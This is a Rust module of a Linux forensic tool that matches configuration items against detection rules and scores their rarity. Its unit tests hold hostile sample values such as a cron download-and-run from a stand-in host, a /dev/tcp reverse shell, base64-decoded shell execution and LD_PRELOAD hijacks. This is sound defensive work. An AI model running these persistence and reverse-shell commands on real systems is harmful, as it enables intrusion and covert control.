//! Rules over configuration items, and the hunt tail they fill.
//!
//! A rule names an area, a path, a key and value patterns and the texts that must or must
//! not be in the value; the built-in set is `src/builtin/rules.yaml`, more come from YAML
//! files given with `--rules`. Every item is checked against every rule; the hits fill the
//! row's analysis tail the way the other c00pr tools do (caarea's docs/hunting.md):
//!
//! - `hunt`: `significant` for a high rule, `candidate` for a medium or a low one, or
//!   `habitual` when the clean reference evidence holds the very same item and the same
//!   rule fired on it there (a stock cloud image's sudo rule for its default user);
//! - `hunt_score`: the sum of the rules' rarity measured on the clean reference
//!   (`-10 · log10(hits / rows)`, the bound `-10 · log10(1 / (rows + 1))` for a rule that
//!   never fired), capped at 100; a rule measured below 10 points fires on more than one
//!   reference item in ten and is noise: its clause stays, it gives neither state nor
//!   points; a rule not measured yet gives 0 points and says so;
//! - `hunt_why`: `rule <NAME> (<severity>): <why> [<technique>]`, strongest first, `; `
//!   between clauses.

use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;

use serde::Deserialize;

use crate::parse::Item;

pub mod code {
    crate::codes! {
        RULES_BUILTIN = 350, "the built-in rules were loaded; the message gives how many (shown with -v)";
        RULES_FILE_LOADED = 351, "a rules file given with --rules was loaded; the message gives how many rules it adds (shown with -v)";
        RULES_FILE_UNREADABLE = 352, "a rules file or folder given with --rules cannot be read; the run goes on with the other rules";
        RULES_YAML_INVALID = 353, "a rules file is not a valid YAML list of rules; the message gives the line and column; none of its rules are used";
        RULES_RULE_NO_NAME = 354, "a rule has no name; it is skipped (every rule needs a stable name for hunt_why and the rarity table)";
        RULES_RULE_NO_CONDITION = 355, "a rule has neither an area, a path, a key, a value nor data texts: it would fire on everything, so it is skipped";
        RULES_RULE_DUPLICATE = 356, "two rules have the same name; the later one replaces the earlier one (a user rule can override a built-in one this way)";
        RULES_BAD_SEVERITY = 357, "a rule's severity is not high, medium or low; it is read as medium";
        RULES_HIT = 358, "a rule fired on an item (shown with -vv); the row's hunt columns say which and why";
        RULES_HABITUAL = 359, "a rule fired on an item the clean reference holds too, where the same rule fired: the row is habitual, not a finding";
        RULES_NOISE = 360, "a rule fired that the reference measured as noise (below 10 points: more than one reference item in ten); its clause is kept, it gives neither state nor points";
        RULES_NOT_MEASURED = 361, "a rule fired that the rarity table has no measurement for (a user rule, a new built-in one); it gives its state and 0 points until `etcdump --measure` is run";
        RULES_DISABLED = 362, "--no-hunt: no rule was run and the hunt columns are empty";
        RULES_NO_BUILTIN = 363, "--no-builtin-rules: only the rules of the --rules files were run";
        RULES_SCORE_CAPPED = 364, "a row's rules added up to more than 100 points; its score is 100 (shown with -vv)";
        RULES_RARITY_TABLE = 365, "the rarity table of the built-in rules was loaded; the message gives the reference size (shown with -v)";
        RULES_RARITY_BAD_LINE = 366, "a line of a rarity or reference table is not tab-separated as expected; it was skipped";
        RULES_REFERENCE_LOADED = 367, "a reference list (items of a clean host) was loaded with --reference; items in it are habitual (shown with -v)";
        RULES_REFERENCE_UNREADABLE = 368, "a reference list given with --reference cannot be read; the built-in one is used alone";
        RULES_BAD_PATTERN = 369, "a rule's wildcard has an unbalanced brace; it is matched as plain text";
    }
}

/// One rule, as written in YAML.
#[derive(Clone, Debug, Deserialize, PartialEq, Eq)]
pub struct Rule {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub area: Option<String>,
    #[serde(default)]
    pub path: Option<String>,
    #[serde(default)]
    pub not_path: Vec<String>,
    #[serde(default)]
    pub key: Option<String>,
    #[serde(default)]
    pub not_key: Vec<String>,
    #[serde(default)]
    pub value: Option<String>,
    #[serde(default)]
    pub data: Vec<String>,
    #[serde(default)]
    pub and_data: Vec<String>,
    #[serde(default)]
    pub not_data: Vec<String>,
    #[serde(default = "medium")]
    pub severity: String,
    #[serde(default)]
    pub why: String,
    #[serde(default)]
    pub technique: String,
}

fn medium() -> String {
    "medium".into()
}

/// The built-in rules.
pub const BUILTIN_YAML: &str = include_str!("builtin/rules.yaml");
/// The built-in rarity table: `rule \t hits \t rows \t points`.
pub const BUILTIN_RARITY: &str = include_str!("builtin/rarity.tsv");
/// The built-in reference: items of the clean hosts on which a rule fired,
/// `rule \t area \t path \t key \t value`.
pub const BUILTIN_REFERENCE: &str = include_str!("builtin/reference.tsv");

/// Wildcard match, case-insensitive: `*` any run, `?` one character, `{a,b}` any of the
/// alternatives (one level).
pub fn wild(pattern: &str, text: &str) -> bool {
    if let (Some(open), Some(close)) = (pattern.find('{'), pattern.rfind('}')) {
        if open < close {
            let (head, rest) = pattern.split_at(open);
            let alts = &rest[1..close - open];
            let tail = &pattern[close + 1..];
            return alts.split(',').any(|a| wild(&format!("{head}{a}{tail}"), text));
        }
    }
    if pattern.contains('{') != pattern.contains('}') {
        crate::diag::record(code::RULES_BAD_PATTERN, crate::diag::Severity::Info, pattern.to_string());
    }
    fn rec(p: &[char], t: &[char]) -> bool {
        match p.first() {
            None => t.is_empty(),
            Some('*') => (0..=t.len()).any(|i| rec(&p[1..], &t[i..])),
            Some('?') => !t.is_empty() && rec(&p[1..], &t[1..]),
            Some(c) => t.first().is_some_and(|x| x == c) && rec(&p[1..], &t[1..]),
        }
    }
    let p: Vec<char> = pattern.to_lowercase().chars().collect();
    let t: Vec<char> = text.to_lowercase().chars().collect();
    rec(&p, &t)
}

/// Path glob: `*` within a folder, `**` across, `{a,b}`; case-sensitive, like the paths.
pub fn path_glob(pattern: &str, path: &str) -> bool {
    if let (Some(open), Some(close)) = (pattern.find('{'), pattern.rfind('}')) {
        if open < close {
            let alts = &pattern[open + 1..close];
            return alts.split(',').any(|a| path_glob(&format!("{}{a}{}", &pattern[..open], &pattern[close + 1..]), path));
        }
    }
    evidencefs::fs::glob_match(pattern, path)
}

fn contains_any(hay: &str, needles: &[String]) -> bool {
    let h = hay.to_lowercase();
    needles.iter().any(|n| h.contains(&n.to_lowercase()))
}

impl Rule {
    /// Does the rule fire on this item of this file?
    pub fn matches(&self, area: &str, path: &str, item: &Item) -> bool {
        if let Some(a) = &self.area {
            if !wild(a, area) {
                return false;
            }
        }
        if let Some(p) = &self.path {
            if !path_glob(p, path) {
                return false;
            }
        }
        if self.not_path.iter().any(|p| path_glob(p, path)) {
            return false;
        }
        if let Some(k) = &self.key {
            if !wild(k, &item.key) {
                return false;
            }
        }
        if self.not_key.iter().any(|k| wild(k, &item.key)) {
            return false;
        }
        if let Some(v) = &self.value {
            if !wild(v, item.value.trim()) {
                return false;
            }
        }
        if !self.data.is_empty() && !contains_any(&item.value, &self.data) {
            return false;
        }
        if !self.and_data.is_empty() && !contains_any(&item.value, &self.and_data) {
            return false;
        }
        if contains_any(&item.value, &self.not_data) {
            return false;
        }
        true
    }

    /// `high`, `medium` or `low`.
    pub fn level(&self) -> &'static str {
        match self.severity.to_ascii_lowercase().as_str() {
            "high" | "critical" => "high",
            "low" | "info" | "informational" => "low",
            _ => "medium",
        }
    }

    fn rank(&self) -> u8 {
        match self.level() {
            "high" => 3,
            "medium" => 2,
            _ => 1,
        }
    }
}

/// Parses a YAML rule list; bad rules are skipped with a code.
pub fn parse_rules(text: &str, origin: &str) -> crate::diag::Result<Vec<Rule>> {
    let rules: Vec<Rule> = serde_yaml_ng::from_str(text).map_err(|e| crate::diag::fail(code::RULES_YAML_INVALID, format!("{origin}: {e}")))?;
    let mut out = Vec::new();
    for r in rules {
        if r.name.trim().is_empty() {
            crate::diag::warn(code::RULES_RULE_NO_NAME, origin.to_string());
            continue;
        }
        if r.area.is_none() && r.path.is_none() && r.key.is_none() && r.value.is_none() && r.data.is_empty() {
            crate::diag::warn(code::RULES_RULE_NO_CONDITION, format!("{origin}: {}", r.name));
            continue;
        }
        if !matches!(r.severity.to_ascii_lowercase().as_str(), "high" | "medium" | "low" | "critical" | "info" | "informational") {
            crate::diag::warn(code::RULES_BAD_SEVERITY, format!("{origin}: {} says '{}'", r.name, r.severity));
        }
        out.push(r);
    }
    Ok(out)
}

/// A rule's measured rarity.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Rarity {
    pub hits: u64,
    pub rows: u64,
    pub points: u32,
}

/// The points of a rule that fired `hits` times on `rows` reference items.
pub fn points(hits: u64, rows: u64) -> u32 {
    let p = if hits == 0 { 1.0 / (rows as f64 + 1.0) } else { hits as f64 / rows.max(1) as f64 };
    (-10.0 * p.log10()).round().clamp(0.0, 100.0) as u32
}

/// Parses a rarity table.
pub fn parse_rarity(text: &str) -> BTreeMap<String, Rarity> {
    let mut out = BTreeMap::new();
    for l in text.lines() {
        if l.starts_with('#') || l.trim().is_empty() {
            continue;
        }
        let f: Vec<&str> = l.split('\t').collect();
        let parsed = (f.len() == 4).then(|| (f[1].parse::<u64>(), f[2].parse::<u64>(), f[3].parse::<u32>()));
        match parsed {
            Some((Ok(hits), Ok(rows), Ok(points))) => {
                out.insert(f[0].to_string(), Rarity { hits, rows, points });
            }
            _ => {
                crate::diag::warn(code::RULES_RARITY_BAD_LINE, l.to_string());
            }
        }
    }
    out
}

/// The key of a reference entry: rule, area, path, key, value.
pub type RefKey = (String, String, String, String, String);

/// Parses a reference list.
pub fn parse_reference(text: &str) -> BTreeSet<RefKey> {
    let mut out = BTreeSet::new();
    for l in text.lines() {
        if l.starts_with('#') || l.trim().is_empty() {
            continue;
        }
        let f: Vec<&str> = l.split('\t').collect();
        if f.len() != 5 {
            crate::diag::warn(code::RULES_RARITY_BAD_LINE, l.to_string());
            continue;
        }
        out.insert((f[0].into(), f[1].into(), f[2].into(), f[3].into(), f[4].into()));
    }
    out
}

/// Escapes tabs and line breaks for the TSV tables.
pub fn tsv(s: &str) -> String {
    s.replace(['\t', '\n', '\r'], " ")
}

/// The rules of a run, with their rarity and the reference.
#[derive(Clone, Debug, Default)]
pub struct RuleSet {
    pub rules: Vec<Rule>,
    pub rarity: BTreeMap<String, Rarity>,
    pub reference: BTreeSet<RefKey>,
}

/// One rule that fired.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub rule: String,
    pub level: &'static str,
    pub why: String,
    pub technique: String,
    /// Points it gives (0 for noise or habitual or unmeasured).
    pub points: u32,
    pub noise: bool,
    pub measured: bool,
    /// The reference holds the same item with the same rule.
    pub habitual: bool,
}

/// The analysis tail of one row.
#[derive(Clone, Debug, Default, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub struct Tail {
    pub hunt: String,
    pub score: Option<u32>,
    pub why: String,
}

impl RuleSet {
    /// The built-in rules (unless `builtin` is false), plus every YAML file of `extra`
    /// (files or folders), with the built-in rarity and reference, plus `reference` files.
    pub fn load(builtin: bool, extra: &[std::path::PathBuf], reference: &[std::path::PathBuf]) -> RuleSet {
        let mut set = RuleSet::default();
        let mut by_name: BTreeMap<String, usize> = BTreeMap::new();
        let mut add = |set: &mut RuleSet, rules: Vec<Rule>| {
            for r in rules {
                match by_name.get(&r.name) {
                    Some(&i) => {
                        crate::diag::warn(code::RULES_RULE_DUPLICATE, r.name.clone());
                        set.rules[i] = r;
                    }
                    None => {
                        by_name.insert(r.name.clone(), set.rules.len());
                        set.rules.push(r);
                    }
                }
            }
        };
        if builtin {
            let rules = parse_rules(BUILTIN_YAML, "built-in").expect("built-in rules parse");
            crate::diag::info(code::RULES_BUILTIN, format!("{} rule(s)", rules.len()));
            add(&mut set, rules);
            set.rarity = parse_rarity(BUILTIN_RARITY);
            set.reference = parse_reference(BUILTIN_REFERENCE);
            let rows = set.rarity.values().map(|r| r.rows).max().unwrap_or(0);
            crate::diag::info(code::RULES_RARITY_TABLE, format!("{} rule(s) measured on {rows} reference item(s)", set.rarity.len()));
        } else {
            crate::diag::info(code::RULES_NO_BUILTIN, "built-in rules off");
        }
        for path in extra {
            for f in yaml_files(path) {
                match std::fs::read_to_string(&f) {
                    Ok(text) => {
                        if let Ok(rules) = parse_rules(&text, &f.display().to_string()) {
                            crate::diag::info(code::RULES_FILE_LOADED, format!("{}: {} rule(s)", f.display(), rules.len()));
                            add(&mut set, rules);
                        }
                    }
                    Err(e) => {
                        crate::diag::warn(code::RULES_FILE_UNREADABLE, format!("{}: {e}", f.display()));
                    }
                }
            }
        }
        for r in reference {
            match std::fs::read_to_string(r) {
                Ok(text) => {
                    let more = parse_reference(&text);
                    crate::diag::info(code::RULES_REFERENCE_LOADED, format!("{}: {} item(s)", r.display(), more.len()));
                    set.reference.extend(more);
                }
                Err(e) => {
                    crate::diag::warn(code::RULES_REFERENCE_UNREADABLE, format!("{}: {e}", r.display()));
                }
            }
        }
        set
    }

    /// The rules that fire on an item, strongest first.
    pub fn hits(&self, area: &str, path: &str, item: &Item) -> Vec<Hit> {
        let mut out: Vec<(&Rule, Hit)> = Vec::new();
        for r in &self.rules {
            if !r.matches(area, path, item) {
                continue;
            }
            crate::diag::record(code::RULES_HIT, crate::diag::Severity::Info, format!("{} on {path}: {}", r.name, item.key));
            let habitual = self.reference.contains(&(r.name.clone(), area.to_string(), path.to_string(), tsv(&item.key), tsv(&item.value)));
            let (points, noise, measured) = match self.rarity.get(&r.name) {
                Some(m) if m.points < 10 => (0, true, true),
                Some(m) => (m.points, false, true),
                None => (0, false, false),
            };
            out.push((r, Hit { rule: r.name.clone(), level: r.level(), why: r.why.clone(), technique: r.technique.clone(), points: if habitual { 0 } else { points }, noise, measured, habitual }));
        }
        out.sort_by(|a, b| b.0.rank().cmp(&a.0.rank()).then(b.1.points.cmp(&a.1.points)).then(a.1.rule.cmp(&b.1.rule)));
        out.into_iter().map(|(_, h)| h).collect()
    }
}

/// Every `.yaml`/`.yml` file of a path (the path itself when it is a file), sorted.
pub fn yaml_files(path: &Path) -> Vec<std::path::PathBuf> {
    if path.is_file() {
        return vec![path.to_path_buf()];
    }
    let mut out: Vec<std::path::PathBuf> = match std::fs::read_dir(path) {
        Ok(rd) => rd.filter_map(|e| e.ok().map(|e| e.path())).filter(|p| p.extension().is_some_and(|x| x.eq_ignore_ascii_case("yaml") || x.eq_ignore_ascii_case("yml"))).collect(),
        Err(e) => {
            crate::diag::warn(code::RULES_FILE_UNREADABLE, format!("{}: {e}", path.display()));
            Vec::new()
        }
    };
    out.sort();
    out
}

/// The tail the hits give.
pub fn judge(hits: &[Hit]) -> Tail {
    if hits.is_empty() {
        return Tail::default();
    }
    let mut why: Vec<String> = Vec::new();
    let mut score: u32 = 0;
    let mut best: u8 = 0;
    let mut habitual = false;
    for h in hits {
        let tech = if h.technique.is_empty() { String::new() } else { format!(" [{}]", h.technique) };
        let note = if h.habitual {
            habitual = true;
            crate::diag::record(code::RULES_HABITUAL, crate::diag::Severity::Info, h.rule.clone());
            " (habitual: the clean reference has it)"
        } else if h.noise {
            crate::diag::record(code::RULES_NOISE, crate::diag::Severity::Info, h.rule.clone());
            " (noise on the reference)"
        } else if !h.measured {
            crate::diag::record(code::RULES_NOT_MEASURED, crate::diag::Severity::Info, h.rule.clone());
            " (not measured)"
        } else {
            ""
        };
        why.push(format!("rule {} ({}): {}{tech}{note}", h.rule, h.level, h.why));
        if h.habitual || h.noise {
            continue;
        }
        score += h.points;
        best = best.max(match h.level {
            "high" => 3,
            "medium" => 2,
            _ => 1,
        });
    }
    if score > 100 {
        crate::diag::record(code::RULES_SCORE_CAPPED, crate::diag::Severity::Info, format!("{score}"));
        score = 100;
    }
    let hunt = match best {
        3 => "significant",
        1 | 2 => "candidate",
        _ if habitual => "habitual",
        _ => "",
    };
    Tail { hunt: hunt.to_string(), score: if best > 0 { Some(score) } else { None }, why: why.join("; ") }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn item(key: &str, value: &str) -> Item {
        Item::new(key, value, "x", 1)
    }

    fn builtin() -> RuleSet {
        crate::diag::set_quiet(true);
        RuleSet::load(true, &[], &[])
    }

    fn fired(set: &RuleSet, area: &str, path: &str, key: &str, value: &str) -> Vec<String> {
        set.hits(area, path, &item(key, value)).into_iter().map(|h| h.rule).collect()
    }

    #[test]
    fn wildcards() {
        assert!(wild("*PermitRootLogin", "Match User x|PermitRootLogin"));
        assert!(wild("service.exec*", "Service.ExecStartPre"));
        assert!(wild("{cron,at}", "AT"));
        assert!(!wild("{cron,at}", "systemd"));
        assert!(wild("a?c", "abc"));
        assert!(!wild("a?c", "ac"));
        assert!(wild("x{y", "x{y"));
        assert!(crate::diag::has(code::RULES_BAD_PATTERN));
        assert!(path_glob("home/*/.config/systemd/user/**", "home/bob/.config/systemd/user/x.service"));
        assert!(path_glob("**/.ssh/authorized_keys*", "var/www/.ssh/authorized_keys"));
        assert!(path_glob("etc/{passwd,group}", "etc/group"));
        assert!(!path_glob("etc/passwd", "etc/Passwd"));
        crate::diag::drain();
    }

    #[test]
    fn builtin_rules_load_with_unique_names_and_reasons() {
        let set = builtin();
        assert!(set.rules.len() >= 45, "{}", set.rules.len());
        let mut names = BTreeSet::new();
        for r in &set.rules {
            assert!(r.name.starts_with("LNX-"), "{}", r.name);
            assert!(names.insert(r.name.clone()), "{} twice", r.name);
            assert!(r.why.len() > 30, "{}: why too short", r.name);
            assert!(r.technique.starts_with('T'), "{}: technique", r.name);
            assert!(matches!(r.severity.as_str(), "high" | "medium" | "low"), "{}", r.name);
        }
        assert!(crate::diag::has(code::RULES_BUILTIN));
        crate::diag::drain();
    }

    #[test]
    fn rarity_table_covers_every_builtin_rule() {
        let set = builtin();
        for r in &set.rules {
            assert!(set.rarity.contains_key(&r.name), "{} not measured: run etcdump --measure", r.name);
        }
        crate::diag::drain();
    }

    #[test]
    fn accounts_rules() {
        let set = builtin();
        assert_eq!(fired(&set, "accounts", "etc/passwd", "toor", "uid=0 gid=0 home=/root shell=/bin/bash system=no interactive=yes gecos="), vec!["LNX-UID0-ACCOUNT"]);
        assert!(fired(&set, "accounts", "etc/passwd", "root", "uid=0 gid=0 home=/root shell=/bin/bash system=no interactive=yes gecos=").is_empty());
        assert_eq!(fired(&set, "accounts", "etc/shadow", "bob", "password=empty scheme=none"), vec!["LNX-EMPTY-PASSWORD"]);
        assert_eq!(fired(&set, "accounts", "etc/passwd", "www-data", "uid=33 gid=33 home=/var/www shell=/bin/bash system=yes interactive=yes gecos="), vec!["LNX-SYSTEM-ACCOUNT-SHELL"]);
        assert!(fired(&set, "accounts", "etc/passwd", "x", "uid=1001 gid=1001 home=/home/x shell=/tmp/sh system=no interactive=yes gecos=").contains(&"LNX-ACCOUNT-SHELL-ODD-PLACE".to_string()));
        assert_eq!(fired(&set, "accounts", "etc/group", "docker", "gid=999 members=eve privileged=yes"), vec!["LNX-PRIVILEGED-GROUP-MEMBER"]);
        assert!(fired(&set, "accounts", "etc/group", "docker", "gid=999 members= privileged=yes").is_empty());
        crate::diag::drain();
    }

    #[test]
    fn sudo_and_ssh_rules() {
        let set = builtin();
        assert_eq!(fired(&set, "sudo", "etc/sudoers.d/x", "eve", "ALL=(ALL) NOPASSWD: ALL"), vec!["LNX-SUDO-NOPASSWD-ALL"]);
        assert_eq!(fired(&set, "sudo", "etc/sudoers.d/x", "eve", "ALL=(root) NOPASSWD: /usr/bin/vim"), vec!["LNX-SUDO-SHELL-OR-EDITOR"]);
        assert_eq!(fired(&set, "sudo", "etc/sudoers", "includedir", "/opt/sudo.d"), vec!["LNX-SUDOERS-INCLUDE-ODD"]);
        assert!(fired(&set, "sudo", "etc/sudoers", "includedir", "/etc/sudoers.d").is_empty());
        assert_eq!(fired(&set, "sudo", "etc/sudoers", "Defaults", "!authenticate"), vec!["LNX-SUDO-NO-AUTHENTICATE"]);
        assert_eq!(fired(&set, "ssh", "etc/ssh/sshd_config", "PermitRootLogin", "yes"), vec!["LNX-SSH-ROOT-LOGIN"]);
        assert!(fired(&set, "ssh", "etc/ssh/sshd_config", "PermitRootLogin", "prohibit-password").is_empty());
        assert_eq!(fired(&set, "ssh", "etc/ssh/sshd_config", "Match User x|PermitEmptyPasswords", "yes"), vec!["LNX-SSH-EMPTY-PASSWORDS"]);
        assert_eq!(fired(&set, "ssh", "etc/ssh/sshd_config.d/60.conf", "PasswordAuthentication", "yes"), vec!["LNX-SSH-PASSWORD-AUTH"]);
        assert!(fired(&set, "ssh", "home/bob/.ssh/config", "PasswordAuthentication", "yes").is_empty());
        assert_eq!(fired(&set, "ssh", "etc/ssh/sshd_config", "AuthorizedKeysFile", "/var/tmp/.k"), vec!["LNX-SSH-AUTHKEYS-FILE-ODD"]);
        assert!(fired(&set, "ssh", "etc/ssh/sshd_config", "AuthorizedKeysFile", ".ssh/authorized_keys .ssh/authorized_keys2").is_empty());
        assert_eq!(fired(&set, "ssh", "etc/ssh/sshd_config", "AuthorizedKeysCommand", "/opt/keys.sh"), vec!["LNX-SSH-AUTHKEYS-COMMAND"]);
        assert!(fired(&set, "ssh", "etc/ssh/sshd_config", "AuthorizedKeysCommand", "/usr/bin/google_authorized_keys").is_empty());
        assert!(fired(&set, "ssh", "etc/ssh/sshd_config", "Match User x|ForceCommand", "/tmp/x").contains(&"LNX-SSH-FORCECOMMAND-ODD".to_string()));
        crate::diag::drain();
    }

    #[test]
    fn key_rules() {
        let set = builtin();
        assert_eq!(fired(&set, "keys", "home/bob/.ssh/authorized_keys", "k", "type=ssh-rsa key=AAAA options=command=\"/tmp/x\" comment="), vec!["LNX-AUTHKEY-COMMAND"]);
        assert_eq!(fired(&set, "keys", "root/.ssh/authorized_keys", "k", "type=ssh-rsa key=AAAA options= comment="), vec!["LNX-AUTHKEY-ROOT"]);
        assert_eq!(fired(&set, "keys", "var/www/.ssh/authorized_keys", "k", "type=ssh-rsa key=AAAA options= comment="), vec!["LNX-AUTHKEY-SERVICE-HOME"]);
        assert!(fired(&set, "keys", "home/bob/.ssh/authorized_keys", "k", "type=ssh-rsa key=AAAA options= comment=").is_empty());
        crate::diag::drain();
    }

    #[test]
    fn persistence_rules() {
        let set = builtin();
        let mut f = fired(&set, "cron", "etc/crontab", "*/5 * * * *", "user=root command=curl -s http://e.vil/a | sh");
        f.sort();
        assert_eq!(f, vec!["LNX-DOWNLOAD-AND-RUN"]);
        assert_eq!(fired(&set, "cron", "etc/cron.d/x", "@reboot", "user=root command=/tmp/.x/run"), vec!["LNX-RUNS-FROM-TEMP"]);
        assert!(fired(&set, "cron", "etc/cron.daily/clean", "find", "find /tmp -mtime +7 -delete").is_empty());
        assert_eq!(fired(&set, "systemd", "etc/systemd/system/u.service", "Service.ExecStart", "/bin/sh -c 'echo aGk= | base64 -d | sh'"), vec!["LNX-BASE64-DECODE"]);
        assert!(fired(&set, "shell", "home/bob/.bashrc", "bash", "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1").contains(&"LNX-REVERSE-SHELL".to_string()));
        assert_eq!(fired(&set, "systemd", "etc/systemd/system/u.service", "Service.ExecStart", "/home/bob/.u/run"), vec!["LNX-SYSTEMD-EXEC-HOME"]);
        assert_eq!(fired(&set, "systemd", "home/bob/.config/systemd/user/u.service", "Service.ExecStart", "/usr/bin/true"), vec!["LNX-SYSTEMD-USER-UNIT"]);
        assert_eq!(fired(&set, "systemd", "etc/systemd/system-generators/g", "g", "size=10"), vec!["LNX-SYSTEMD-GENERATOR"]);
        assert_eq!(fired(&set, "init", "etc/rc.local", "nohup", "nohup /opt/x &"), vec!["LNX-RC-LOCAL"]);
        assert!(fired(&set, "init", "etc/rc.local", "exit", "exit 0").is_empty());
        assert_eq!(fired(&set, "preload", "etc/ld.so.preload", "/lib/x.so", "/lib/x.so"), vec!["LNX-LD-PRELOAD"]);
        assert_eq!(fired(&set, "preload", "etc/ld.so.conf.d/x.conf", "/dev/shm/lib", "/dev/shm/lib"), vec!["LNX-LDCONF-ODD-DIR"]);
        assert_eq!(fired(&set, "environment", "etc/environment", "LD_PRELOAD", "/lib/x.so"), vec!["LNX-ENV-PRELOAD"]);
        assert_eq!(fired(&set, "systemd", "etc/systemd/system/x.service", "Service.Environment", "LD_PRELOAD=/lib/x.so"), vec!["LNX-PROFILE-PRELOAD"]);
        crate::diag::drain();
    }

    #[test]
    fn pam_sources_and_more_rules() {
        let set = builtin();
        assert_eq!(fired(&set, "pam", "etc/pam.d/sshd", "session", "control=optional module=pam_exec.so args=/usr/local/bin/log"), vec!["LNX-PAM-EXEC"]);
        assert_eq!(fired(&set, "pam", "etc/pam.d/common-auth", "auth", "control=sufficient module=pam_permit.so args="), vec!["LNX-PAM-PERMIT-SUFFICIENT"]);
        assert!(fired(&set, "pam", "etc/pam.d/common-auth", "auth", "control=required module=pam_permit.so args=").is_empty());
        assert_eq!(fired(&set, "pam", "etc/pam.d/sshd", "auth", "control=required module=/tmp/pam_unix.so args="), vec!["LNX-PAM-ODD-MODULE"]);
        assert_eq!(fired(&set, "sources", "etc/apt/apt.conf.d/99x", "APT::Update::Pre-Invoke", "APT::Update::Pre-Invoke {\"/tmp/x\"};"), vec!["LNX-APT-HOOK"]);
        assert_eq!(fired(&set, "sources", "etc/apt/sources.list.d/x.list", "http://repo.example/", "type=deb suite=./ components= options=trusted=yes"), vec!["LNX-APT-TRUSTED"]);
        assert_eq!(fired(&set, "sources", "etc/apt/sources.list.d/x.list", "http://10.0.0.9/r", "uri=http://10.0.0.9/r"), vec!["LNX-APT-SOURCE-PLAIN-IP"]);
        assert_eq!(fired(&set, "sources", "etc/yum.repos.d/x.repo", "x.gpgcheck", "0"), vec!["LNX-YUM-GPGCHECK-OFF"]);
        assert_eq!(fired(&set, "autostart", "home/bob/.config/autostart/u.desktop", "Desktop Entry.Exec", "/usr/bin/u"), vec!["LNX-AUTOSTART-ENTRY"]);
        assert!(fired(&set, "autostart", "etc/xdg/autostart/u.desktop", "Desktop Entry.Exec", "/usr/bin/u").is_empty());
        assert!(fired(&set, "motd", "etc/update-motd.d/99x", "curl", "curl http://x/y").contains(&"LNX-MOTD-NETWORK".to_string()));
        assert_eq!(fired(&set, "udev", "etc/udev/rules.d/99.rules", "ACTION", "ACTION==\"add\", RUN+=\"/opt/x\""), vec!["LNX-UDEV-RUN"]);
        assert_eq!(fired(&set, "modules", "etc/modules-load.d/x.conf", "rk", "rk"), vec!["LNX-MODULE-LOADED-AT-BOOT"]);
        assert_eq!(fired(&set, "modules", "etc/modprobe.d/x.conf", "install", "install usb-storage /opt/x"), vec!["LNX-MODPROBE-INSTALL"]);
        assert!(fired(&set, "modules", "etc/modprobe.d/x.conf", "install", "install usb-storage /bin/false").is_empty());
        assert_eq!(fired(&set, "network", "etc/hosts", "10.9.9.9", "update.vendor.com"), vec!["LNX-HOSTS-REDIRECT"]);
        assert!(fired(&set, "network", "etc/hosts", "127.0.0.1", "localhost").is_empty());
        assert!(fired(&set, "logrotate", "etc/logrotate.d/x", "x|postrotate", "curl http://x").contains(&"LNX-LOGROTATE-SCRIPT-NETWORK".to_string()));
        let alias = fired(&set, "shell", "home/bob/.bashrc", "alias", "alias sudo='/tmp/s'");
        assert!(alias.contains(&"LNX-SHELL-ALIAS-SUDO".to_string()) && alias.contains(&"LNX-RUNS-FROM-TEMP".to_string()), "{alias:?}");
        assert_eq!(fired(&set, "shell", "home/bob/.bashrc", "export", "export PROMPT_COMMAND='curl x'"), vec!["LNX-SHELL-PROMPT-COMMAND"]);
        assert_eq!(fired(&set, "shell", "home/bob/.bashrc", "unset", "unset HISTFILE"), vec!["LNX-SHELL-HISTORY-OFF"]);
        assert_eq!(fired(&set, "at", "var/spool/cron/atjobs/a1", "id", "id"), vec!["LNX-AT-JOB"]);
        assert_eq!(fired(&set, "cron", "var/spool/cron/crontabs/bob", "0 3 * * *", "user=bob command=/home/bob/b.sh"), vec!["LNX-USER-CRONTAB"]);
        assert!(fired(&set, "cron", "var/spool/cron/crontabs/bob", "MAILTO", "x").is_empty());
        assert_eq!(fired(&set, "firewall", "etc/iptables/rules.v4", "-A", "-A INPUT -p tcp --dport 4444 -j ACCEPT"), vec!["LNX-FIREWALL-OPENED"]);
        assert_eq!(fired(&set, "mounts", "etc/fstab", "/tmp", "device=tmpfs type=tmpfs options=defaults"), vec!["LNX-FSTAB-NOEXEC-REMOVED"]);
        crate::diag::drain();
    }

    #[test]
    fn judging_states_scores_and_reasons() {
        let h = |rule: &str, level: &'static str, points: u32, noise: bool, measured: bool, habitual: bool| Hit { rule: rule.into(), level, why: "w".into(), technique: "T1".into(), points, noise, measured, habitual };
        assert_eq!(judge(&[]), Tail::default());
        let t = judge(&[h("A", "high", 39, false, true, false), h("B", "low", 30, false, true, false)]);
        assert_eq!(t.hunt, "significant");
        assert_eq!(t.score, Some(69));
        assert_eq!(t.why, "rule A (high): w [T1]; rule B (low): w [T1]");
        let c = judge(&[h("B", "medium", 21, false, true, false)]);
        assert_eq!(c.hunt, "candidate");
        let n = judge(&[h("N", "high", 0, true, true, false)]);
        assert_eq!(n.hunt, "");
        assert_eq!(n.score, None);
        assert!(n.why.contains("noise"));
        let hab = judge(&[h("H", "medium", 0, false, true, true)]);
        assert_eq!(hab.hunt, "habitual");
        assert_eq!(hab.score, None);
        assert!(hab.why.contains("habitual"));
        let un = judge(&[h("U", "low", 0, false, false, false)]);
        assert_eq!(un.hunt, "candidate");
        assert_eq!(un.score, Some(0));
        assert!(un.why.contains("not measured"));
        let cap = judge(&[h("A", "high", 39, false, true, false), h("B", "high", 39, false, true, false), h("C", "high", 39, false, true, false)]);
        assert_eq!(cap.score, Some(100));
        assert!(crate::diag::has(code::RULES_SCORE_CAPPED));
        crate::diag::drain();
    }

    #[test]
    fn points_scale() {
        assert_eq!(points(1, 128), 21);
        assert_eq!(points(1, 1000), 30);
        assert_eq!(points(0, 8671), 39);
        assert_eq!(points(5, 10), 3);
        assert_eq!(points(10, 10), 0);
        assert_eq!(points(0, 0), 0);
    }

    #[test]
    fn habitual_items_from_the_reference() {
        let mut set = builtin();
